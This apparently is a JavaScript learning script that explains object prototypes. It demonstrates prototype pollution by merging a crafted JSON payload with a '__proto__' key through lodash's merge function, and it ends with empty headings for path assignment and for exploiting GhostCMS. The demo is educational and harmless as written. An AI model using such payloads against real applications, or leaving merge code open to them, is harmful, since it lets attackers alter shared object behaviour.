const _ = require('lodash');     
function Dog() { 

}

Dog.prototype.talk = function () { 
  return 42;
}

var corgi = new Dog();
var myval = corgi.talk();
console.log(myval);


var pug = new Dog();

//points to function dog
pug.constructor;

//Points to the class definition of dog
pug.constructor.prototype

//Points to the class definition of dog
pug.__proto__;

//function and object mixed up toogether??!!
var basengi = new Dog();
var name = "__proto__";

basengi["__proto__"] === basengi.__proto__;
basengi[name] === basengi.__proto__;
basengi["toString"] === basengi.toString;


// What is prototype pollution
// Imagine you want to add a method to every class
//like toString or Display or debug output say
//you might make a mustakje and break it
//hackers do the same thing butt maliciously
Object.prototype.containsTheAnswerToLife = function () { 
  return this.hasOwnProperty("42");
} 

var a = { "42": true };
console.log(a.containsTheAnswerToLife());

var b = { "43": true };
console.log(b.containsTheAnswerToLife());


//Merge? lodash and hoek
var d = {}
console.log("d.polluted", d.polluted)
var a = { "a": 1, "b": 2 };
var b = JSON.parse('{"__proto__":{"polluted":1}}');
var c = _.merge(a, b);
console.log("a", a);
console.log("b", b);
console.log("c", c);
console.log("c.polluted", c.polluted);
console.log("d.polluted", d.polluted);

//clone as well that uses merge as above

//Path assignment vuln


//Exploitation
// GhostCMS 1.19.2
